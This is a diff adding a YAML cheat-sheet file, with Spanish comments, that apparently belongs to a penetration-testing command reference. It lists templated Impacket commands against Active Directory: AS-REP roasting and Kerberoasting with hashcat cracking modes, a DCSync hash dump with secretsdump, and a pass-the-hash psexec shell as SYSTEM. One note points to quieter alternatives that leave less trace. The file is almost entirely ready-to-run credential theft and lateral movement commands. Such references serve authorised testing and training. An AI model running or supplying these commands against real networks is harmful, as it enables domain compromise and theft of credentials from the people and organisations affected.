@@ -1,0 +1,37 @@
+# Comandos de Impacket. Un archivo por herramienta; `area` vale para todos salvo que un comando
+# lleve la suya. Variables válidas: ver src/lib/variables.ts. Usa siempre `cmd: |`.
+tool: impacket
+area: ad
+url: https://github.com/fortra/impacket
+commands:
+  - id: impacket-getnpusers
+    title: AS-REP Roasting sin credenciales
+    cmd: |
+      impacket-GetNPUsers {{DOMAIN}}/ -dc-ip {{DC_IP}} -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+    phase: credential-access
+    tags: [kerberos, as-rep-roasting]
+    notes: Solo devuelve hash de las cuentas sin preautenticación Kerberos (DONT_REQ_PREAUTH). Se crackea con hashcat -m 18200.
+
+  - id: impacket-getuserspns
+    title: Kerberoasting
+    cmd: |
+      impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{DC_IP}} -request -outputfile kerberoast.hash
+    phase: credential-access
+    tags: [kerberos, kerberoasting, spn]
+    notes: Basta con cualquier cuenta de dominio. Se crackea con hashcat -m 13100 (RC4) o 19700 (AES256).
+
+  - id: impacket-secretsdump-dcsync
+    title: DCSync con secretsdump
+    cmd: |
+      impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{DC_IP}} -just-dc-ntlm
+    phase: credential-access
+    tags: [dcsync, ntlm]
+    notes: Requiere derechos de replicación sobre el dominio (DS-Replication-Get-Changes y Get-Changes-All).
+
+  - id: impacket-psexec-pth
+    title: Shell como SYSTEM con pass-the-hash
+    cmd: |
+      impacket-psexec {{DOMAIN}}/Administrator@{{RHOST}} -hashes :{{HASH}}
+    phase: lateral
+    tags: [pass-the-hash, smb]
+    notes: Crea un servicio en el objetivo, así que es ruidoso. wmiexec o smbexec dejan menos rastro.
